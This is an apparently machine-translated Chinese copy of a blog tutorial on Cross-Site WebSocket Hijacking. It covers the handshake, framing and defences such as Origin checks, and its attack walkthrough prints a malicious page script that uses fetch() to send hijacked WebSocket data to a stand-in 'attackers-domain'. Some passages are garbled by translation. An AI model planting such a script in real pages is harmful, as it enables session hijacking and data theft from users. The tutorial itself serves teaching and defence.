<html>
<head>
<title>Cross-Site WebSocket Hijacking (CSWSH)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨站点WebSocket劫持(CSWSH)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc?source=collection_archive---------1-----------------------#2021-08-23">https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc?source=collection_archive---------1-----------------------#2021-08-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="a207" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">了解WebSocket攻击的执行！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/92617e280f5eafe700285893d4c4d913.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5jX4tpAPArHsuMMtfrMx8g.png"/></div></div></figure><p id="c21c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们开始真正的入侵之前，了解什么是WebSocket以及web socket的不同种类是至关重要的。</p><p id="3ff9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好！大家好，欢迎来到这个新博客，我们将看看WebSocket协议和CSWSH漏洞，以及它在开放互联网上有多常见。由于Vickie Li的一篇文章，我第一次知道了跨站点WebSocket劫持(CSWSH)漏洞。对于那些一直读到最后的读者，我提供了一个cswsh-scanner实用程序和资源，您可以用它来测试WebSocket应用程序是如何受到危害的。</p><p id="66f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">让我们先了解一下，什么是WebSockets？</strong></p><p id="f9bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在现代web应用程序中，WebSockets是常用的。它们从HTTP开始，通过双向异步通信提供持久的连接。</p><p id="3388" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">WebSockets用于各种任务，包括用户交互和敏感数据的传输。普通HTTP可能出现的几乎任何web安全缺陷也可能出现在WebSockets连接中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/fc0d856497479940c392edff79e8554b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qXleB2ITr6qNII6_XeOWPQ.jpeg"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated"><a class="ae kx" href="https://portswigger.net/web-security/websockets" rel="noopener ugc nofollow" target="_blank"> WebSockets </a></figcaption></figure><p id="6135" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">RFC 6455 定义了WebSocket协议。该协议有两种URI方案:</p><ol class=""><li id="ef91" class="ld le iq jp b jq jr ju jv jy lf kc lg kg lh kk li lj lk ll bi translated">ws: / host [: port] path [？查询]进行普通连接。</li><li id="c5ec" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk li lj lk ll bi translated">wss: / host [: port] path [？查询TLS隧道连接。</li></ol><p id="8469" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">WebSockets在当前的web开发中被广泛使用，所有主流编程语言和浏览器都支持它们。在线聊天室、留言板、网络界面和商业应用都使用它。使用搜索引擎<a class="ae kx" href="https://www.shodan.io/" rel="noopener ugc nofollow" target="_blank"> shodan.io </a>可以很容易地在互联网上找到WebSocket应用。用公式表达一个简单的查询就足够了。</p><p id="fef0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不是一个懒惰的懒汉，完成了以下任务:</p><blockquote class="lr ls lt"><p id="5ba1" class="jn jo lu jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><em class="iq">搜索Sec-web socket-Version HTTP/1.1 400错误请求于2021年8月20日返回</em> 106，165 <em class="iq">个结果</em></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ly"><img src="../Images/daaf2efb42f7d8b1f0b16faffdbf4666.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kmO-PwbYuKTD5k4Min3W0A.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">Shodan输出</figcaption></figure><p id="84c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为回应，来自世界各地的十万多个地址被发现。</p><p id="7107" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">建立关系</strong> <br/>让我们来看看WebSocket的运行情况。握手是客户端和服务器之间通信的第一步。客户端和服务器使用HTTP协议进行握手，但是传递的消息的格式略有不同。并非所有HTTP消息标准都得到满足。例如，缺少Content-Length头。</p><p id="c631" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，客户端与服务器建立连接，并发送以下请求:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="a3f3" class="me mf iq ma b gy mg mh l mi mj">GET /echo HTTP/1.1<br/>Host: localhost:8081<br/>Sec-WebSocket-Version: 13<br/>Origin: http://localhost:8081<br/>Sec-WebSocket-Key: <!-- -->dGhlIHNkaXBsZSBub31jZQ==<br/>Connection: keep-alive, Upgrade<br/>Upgrade: websocket</span></pre><p id="6ac2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">连接:Sec-WebSocket-Version，Sec-WebSocket-Key升级和升级:WebSocket头是必须的；否则，服务器将以HTTP / 1.1 400错误请求进行响应。下面是服务器如何响应客户端的请求:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="dff4" class="me mf iq ma b gy mg mh l mi mj">HTTP/1.1 101 Switching Protocols<br/>Upgrade: websocket<br/>Connection: Upgrade<br/>Sec-WebSocket-Accept: s3pPLMBiTxaQ3oYGazhZRuK+xOo=</span></pre><p id="5832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">客户端生成Sec-WebSocket-Key头，作为一个以Base64编码的随机16字节值。在围棋中，有一个版本的头球阵型:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="471a" class="me mf iq ma b gy mg mh l mi mj">func generateChallengeKey() (string, error) {<br/>  p := make([]byte, 16)<br/>  if _, err := io.ReadFull(rand.Reader, p); err != nil {<br/>    return "", err<br/>  }<br/>  return base64.StdEncoding.EncodeToString(p), nil<br/>}</span></pre><p id="a1be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面的过程用于在响应中创建Sec-WebSocket-Accept头。GUID 258 eafa 5-E914–47DA-95CA-C5 ab 0 DC 85 b 11与Sec-WebSocket-Key标头中的字符串值连接在一起。然后使用第一段中的字符串计算SHA-1散列。哈希以Base64编码。在围棋中，有一个版本的头球阵型:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="fe6c" class="me mf iq ma b gy mg mh l mi mj">const GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"<br/>func computeAcceptKey(challengeKey string) string {<br/>  h := sha1.New()<br/>  h.Write([]byte(challengeKey + GUID))<br/>  return base64.StdEncoding.EncodeToString(h.Sum(nil))<br/>}</span></pre><p id="7084" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Sec-WebSocket-Key和Sec-WebSocket-Accept标头不用于授权或支持会话；相反，它们确保请求和响应都使用WebSocket协议。这确保了服务器不接受来自不使用WebSockets的客户端的请求。</p><p id="ab05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">RFC 6455进一步建议为每个连接随机选择Sec-WebSocket-Key。这意味着任何缓存的代理结果都将有一个无效的Sec-WebSocket-Accept，导致握手失败，而不是意外读取缓存的数据。客户端验证Sec-WebSocket-Accept值，并期待101交换协议状态代码完成握手。握手完成后，初始HTTP连接被替换为使用相同TCP / IP连接的WebSocket连接。任何一方都可以在此时开始发送数据。</p><blockquote class="lr ls lt"><p id="49a3" class="jn jo lu jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">利用Chrome中提供的“开发工具”来监控WebSocket流量是很方便的。</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mk"><img src="../Images/ef9a1e50c2e1a26273f38857b1930b50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OxwxjZpTq_sNMd4XAlop5w.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">利用开发工具</figcaption></figure><p id="ee1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">传输数据</strong> <br/>向WebSocket发送消息的方法是什么？</p><p id="825e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">数据通过WebSocket协议以一系列帧的形式发送。帧的报头包括以下数据:</p><ul class=""><li id="8f4b" class="ld le iq jp b jq jr ju jv jy lf kc lg kg lh kk ml lj lk ll bi translated">消息是否碎片化；</li><li id="a649" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">传输数据的种类—所有代码；</li><li id="0148" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">邮件是否被屏蔽—屏蔽标志；</li><li id="fb49" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">数据大小；</li><li id="80c3" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">屏蔽键(32位)；</li><li id="306b" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">其他控制数据(乒，乓…)。</li></ul><blockquote class="lr ls lt"><p id="40c6" class="jn jo lu jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">下表说明了帧格式。</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/724486d6fc88e1c7ba189ed7ebb6275f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/1*pGpSbWldRuvMV-dqZlPJ7g.png"/></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">这表明这是消息中的最后一个片段。第一个<br/>片段也可能是最后一个片段。</figcaption></figure><p id="a634" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要深入了解帧格式，可以参考<a class="ae kx" href="https://datatracker.ietf.org/doc/html/rfc6455#section-5.2" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">基础成帧协议</strong> </a></p><p id="d776" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">客户的信息必须全部隐藏起来。一个“你好，世界！”的例子发送到客户端的文本消息(数据来自tcpdump):</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="8a3b" class="me mf iq ma b gy mg mh l mi mj">Fin: True<br/>Reserved: 0x0<br/>Opcode: Text (1)<br/>Mask: True<br/>Payload length: 14<br/>Masking-Key: a9292b01<br/>Payload: eaf7f76dcdb2ac6ed0fefx2021</span></pre><p id="ec21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">屏蔽是通过通常的与屏蔽键的异或来完成的。客户端必须为传输的每个帧更改密钥。服务器不应该屏蔽它的消息。发短信“Hello world！”服务器:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="c120" class="me mf iq ma b gy mg mh l mi mj">Fin: True<br/>Reserved: 0x0<br/>Opcode: Text (1)<br/>Mask: False<br/>Payload length: 14<br/>Payload: 98658c6c7f20776f726c642021</span></pre><p id="75e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为传输消息的伪装不是加密的，所以TLS协议和WSS方案应该与WebSocket一起使用以保持机密性。</p><p id="211f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">行动中的漏洞</strong> <br/>既然协议已经弄清楚了，现在是时候继续讨论CSWSH了。当处理浏览器时，WebSocket协议采用了基于起源的安全架构。SOP(同源策略)和其他安全程序不适用于WebSocket。根据RFC 6455，服务器可以在建立连接时检查来源或不来源:</p><blockquote class="lr ls lt"><p id="e2d2" class="jn jo lu jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><strong class="jp ir">注意:</strong>客户端握手中的origin头元素指示了建立连接的脚本的来源。Origin改为小写，序列化为ASCII。当决定是否接受输入连接时，服务器可以使用该信息。如果服务器不检查连接的来源，它将接受来自任何地方的连接。如果服务器拒绝接受连接，它必须返回一个HTTP错误代码(例如，403 Forbidden)并终止本节描述的WebSocket握手。</p></blockquote><p id="57db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">CSWSH缺陷是由于客户端握手中缺少对Origin标头的验证或验证不正确造成的。这是跨站点请求伪造(CSRF)漏洞的WebSocket特定版本。如果WebSocket应用程序使用cookies来管理用户会话，攻击者可能会使用CSRF攻击伪造握手请求，并操纵通过WebSocket连接发送和接收的消息。</p><p id="da52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，黑客的页面可以使用该连接向服务器发送任意消息，并查看收到的消息内容。这意味着，与传统的CSRF不同，攻击者可以与受损的应用程序进行双向通信。</p><p id="a3f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过成功的CSWSH攻击，黑客可以:</p><ul class=""><li id="f2a8" class="ld le iq jp b jq jr ju jv jy lf kc lg kg lh kk ml lj lk ll bi translated">冒充受害者用户执行未经授权的操作。攻击者可以向服务器应用程序发送任意消息，就像普通的CSRF一样。如果攻击者利用客户端生成的WebSocket消息来完成敏感操作，他可以生成相关的跨域通信并开始这些操作。</li><li id="58bf" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">获取用户有权访问的机密信息。与普通的CSRF不同，跨站点WebSocket劫持允许攻击者使用受控的WebSocket与易受攻击的应用程序进行双向通信。如果应用程序使用服务器生成的WebSocket消息向用户返回任何敏感数据，攻击者就可以截获这种通信和受害用户的数据。</li></ul><p id="695d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">CSWSH的测试环境</strong> <br/> <em class="lu">以利用易受攻击的应用程序的CSWSH攻击为例……………………</em>WSS:/echo . web socket . org<em class="lu">。以下是进攻策略。</em></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mn"><img src="../Images/8c2349efd84baae55fe7979856385a1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y14QCCf2xtDRve-MU-5iJA.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">跨站点WebSocket劫持攻击</figcaption></figure><p id="90a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们回顾一下各个阶段，我们将向您展示在每个级别收到的HTTP格式的消息。</p><p id="bf96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者的浏览器在攻击者的控制下崩溃</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="8c75" class="me mf iq ma b gy mg mh l mi mj">GET / HTTP/1.1<br/>Host: attackers-domain<br/>User-Agent<strong class="ma ir">: </strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>DNT: 1<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>Pragma: no-cache<br/>Cache-Control: no-cache</span></pre><p id="30e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该网站会向用户发送一个包含恶意内容的页面:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="6256" class="me mf iq ma b gy mg mh l mi mj">HTTP/1.1 200 OK<br/>Host: attackers-domain<br/>Date: Mon, 16 Aug 2021 14:11:09 +0101<br/>Connection: close<br/>X-Powered-By: PHP/7.1.21<br/>Content-type: text/html; charset=UTF-8<br/><br/>&lt;!DOCTYPE html&gt;<br/>&lt;html&gt;<br/>&lt;body&gt;<br/>  &lt;script&gt;<br/>    websocket = new WebSocket('wss://echo.websocket.org');<br/>    websocket.onopen = start<br/>    websocket.onmessage = handleReply<br/>    function start(event) {<br/>      websocket.send("attackers-message");<br/>    }<br/>    function handleReply(event) {<br/>      fetch('http://attackers-domain/', {method:'POST',mode:'no-cors',body:event.data})<br/>    }<br/>  &lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="a7ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该脚本由受害者的浏览器执行，该浏览器连接到受害者上下文中的WebSocket应用程序ws: /echo.websocket.org，并传递cookie值:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="9959" class="me mf iq ma b gy mg mh l mi mj">GET / HTTP/1.1<br/>Host: echo.websocket.org<br/>User-Agent<strong class="ma ir">: </strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Sec-WebSocket-Version: 13<br/>Origin: http://attackers-domain<br/>Sec-WebSocket-Key: twWJRgpy7uu5K9RlQCykJQ==<br/>DNT: 1<br/>Connection: keep-alive, Upgrade<br/>Cookie: SESSIONID=bigsecret<br/>Pragma: no-cache<br/>Cache-Control: no-cache<br/>Upgrade: websocket</span></pre><p id="a721" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序启动一个新的与WebSocketcookie相关的连接，其头源:<a class="ae kx" href="http://attackers-domain" rel="noopener ugc nofollow" target="_blank"> http://attackers-domain </a>。SESSIONID=bigsecret:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="011a" class="me mf iq ma b gy mg mh l mi mj">HTTP/1.1 101 Web Socket Protocol Handshake<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Allow-Headers: content-type<br/>Access-Control-Allow-Headers: authorization<br/>Access-Control-Allow-Headers: x-websocket-extensions<br/>Access-Control-Allow-Headers: x-websocket-version<br/>Access-Control-Allow-Headers: x-websocket-protocol<br/>Access-Control-Allow-Origin: http://attackers-domain<br/>Connection: Upgrade<br/>Date: Mon, 16 Aug 2021 14:11:09 GMT<br/>Sec-WebSocket-Accept: dLr0PXjy/nj7MF1Isif/PLQLNM0=<br/>Server: Kaazing Gateway<br/>Upgrade: websocket</span></pre><p id="5e85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者代表受害者发送攻击者消息，负责WebSocket的应用程序发送响应消息。因为我们的应用程序是一个echo服务器，所以响应也将是一条攻击者消息。</p><p id="40d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在该过程结束时，服务器的响应被传输到攻击者控制的域:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="34b1" class="me mf iq ma b gy mg mh l mi mj">POST / HTTP/1.1<br/>Host: attackers-domain<br/>User-Agent<strong class="ma ir">: </strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: http://attackers-domain/<br/>Content-Type: text/plain;charset=UTF-8<br/>Origin: http://attackers-domain<br/>Content-Length: 17<br/>DNT: 1<br/>Connection: close<br/>Pragma: no-cache<br/>Cache-Control: no-cache<br/>attackers-message</span></pre><p id="8fb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">防范CSWSH </strong> <br/>你可以用两种方法来防范CSWSH:</p><ul class=""><li id="5ed4" class="ld le iq jp b jq jr ju jv jy lf kc lg kg lh kk ml lj lk ll bi translated">在握手请求中使用单独的随机令牌(例如CSRF令牌),并向服务器验证它们；</li><li id="5c73" class="ld le iq jp b jq lm ju ln jy lo kc lp kg lq kk ml lj lk ll bi translated">检查服务器上WebSocket握手请求的Origin头。</li></ul><p id="cfab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有时，但不是通常，CSWSH保护已经集成到库中。在Gorilla WebSocket框架中，CSWSH保护的实现如下:</p><pre class="km kn ko kp gt lz ma mb mc aw md bi"><span id="2c27" class="me mf iq ma b gy mg mh l mi mj">// checkSameOrigin returns true if the origin is not set or is equal to the request host.<br/>func checkSameOrigin(r *http.Request) bool {<br/>  origin := r.Header["Origin"]<br/>  if len(origin) == 0 {<br/>    return true<br/>  }<br/>  u, err := url.Parse(origin[0])<br/>  if err != nil {<br/>    return false<br/>  }<br/>  return equalASCIIFold(u.Host, r.Host)<br/>}</span></pre><p id="0f0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">原点检查的默认设置是比较握手请求中主机和原点头的值。</p><blockquote class="lr ls lt"><p id="352e" class="jn jo lu jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><em class="iq">感谢您阅读我的帖子；有什么建议请在下面留言:)</em></p></blockquote><p id="3067" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我的推特账号<a class="ae kx" href="https://twitter.com/n3t_hunt3r?lang=en" rel="noopener ugc nofollow" target="_blank"> @N3T_hunt3r </a>随时联系我。</p><p id="3b2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">cswsh-扫描仪实用程序:</strong></p><div class="mo mp gp gr mq mr"><a href="https://github.com/DeepakPawar95/cswsh" rel="noopener  ugc nofollow" target="_blank"><div class="ms ab fo"><div class="mt ab mu cl cj mv"><h2 class="bd ir gy z fp mw fr fs mx fu fw ip bi translated">GitHub - DeepakPawar95/cswsh:用于跨站点WebSocket劫持的命令行工具</h2><div class="my l"><h3 class="bd b gy z fp mw fr fs mx fu fw dk translated">一个命令行工具，旨在测试和连接到一个WebSocket，这是容易受到跨网站WebSocket劫持…</h3></div><div class="mz l"><p class="bd b dl z fp mw fr fs mx fu fw dk translated">github.com</p></div></div><div class="na l"><div class="nb l nc nd ne na nf kv mr"/></div></div></a></div><p id="d0eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参考/资源:</strong></p><div class="mo mp gp gr mq mr"><a href="https://portswigger.net/web-security/websockets" rel="noopener  ugc nofollow" target="_blank"><div class="ms ab fo"><div class="mt ab mu cl cj mv"><h2 class="bd ir gy z fp mw fr fs mx fu fw ip bi translated">WebSockets安全漏洞测试| Web安全学院</h2><div class="my l"><h3 class="bd b gy z fp mw fr fs mx fu fw dk translated">在这一节中，我们将解释如何操作WebSocket消息和连接，描述安全的种类…</h3></div><div class="mz l"><p class="bd b dl z fp mw fr fs mx fu fw dk translated">portswigger.net</p></div></div><div class="na l"><div class="ng l nc nd ne na nf kv mr"/></div></div></a></div><div class="mo mp gp gr mq mr"><a href="https://appcheck-ng.com/cross-site-hijacking/#" rel="noopener  ugc nofollow" target="_blank"><div class="ms ab fo"><div class="mt ab mu cl cj mv"><h2 class="bd ir gy z fp mw fr fs mx fu fw ip bi translated">WebSocket安全性-跨站点劫持(CSWSH)</h2><div class="my l"><h3 class="bd b gy z fp mw fr fs mx fu fw dk translated">在这篇文章中，我们将看看现代web应用程序中使用的一种新技术，即…</h3></div><div class="mz l"><p class="bd b dl z fp mw fr fs mx fu fw dk translated">appcheck-ng.com</p></div></div><div class="na l"><div class="nh l nc nd ne na nf kv mr"/></div></div></a></div><div class="mo mp gp gr mq mr"><a href="https://www.scip.ch/en/?labs.20210408" rel="noopener  ugc nofollow" target="_blank"><div class="ms ab fo"><div class="mt ab mu cl cj mv"><h2 class="bd ir gy z fp mw fr fs mx fu fw ip bi translated">如何处理WebSockets安全性</h2><div class="my l"><h3 class="bd b gy z fp mw fr fs mx fu fw dk translated">迈克尔·施奈德</h3></div><div class="mz l"><p class="bd b dl z fp mw fr fs mx fu fw dk translated">www.scip.ch</p></div></div><div class="na l"><div class="ni l nc nd ne na nf kv mr"/></div></div></a></div><div class="mo mp gp gr mq mr"><a href="https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/cross-site-websocket-hijacking-cswsh" rel="noopener  ugc nofollow" target="_blank"><div class="ms ab fo"><div class="mt ab mu cl cj mv"><h2 class="bd ir gy z fp mw fr fs mx fu fw ip bi translated">跨站点WebSocket劫持(CSWSH)</h2><div class="my l"><h3 class="bd b gy z fp mw fr fs mx fu fw dk translated">WebSocket连接是通过HTTP发起的，并且是典型的。消息可以长时间发送，并且不会…</h3></div><div class="mz l"><p class="bd b dl z fp mw fr fs mx fu fw dk translated">n3t-hunt3r.gitbook.io</p></div></div><div class="na l"><div class="nj l nc nd ne na nf kv mr"/></div></div></a></div><p id="5fc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://www.youtube.com/watch?v=sysyhbjWmdY" rel="noopener ugc nofollow" target="_blank"> Websocket劫持— YouTube </a></p><p id="a86d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50" rel="noopener">使用跨站点WebSocket劫持(CSWH)的帐户接管|莎兰·帕内加夫| Medium </a></p></div></div>    
</body>
</html>